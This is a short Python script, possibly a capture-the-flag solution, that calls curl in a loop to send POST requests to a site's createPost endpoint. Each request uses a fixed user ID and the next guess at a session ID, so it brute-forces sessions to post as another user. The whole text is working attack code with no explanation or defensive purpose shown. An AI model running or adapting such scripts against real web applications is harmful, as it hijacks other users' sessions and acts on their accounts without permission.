import os
sessionid=0
for x in range(0, 150):
    os.system(f"curl -X POST -d 'userID=24' -d 'sessID={sessionid}' https://bondogge.com/createPost")
    sessionid=sessionid+1
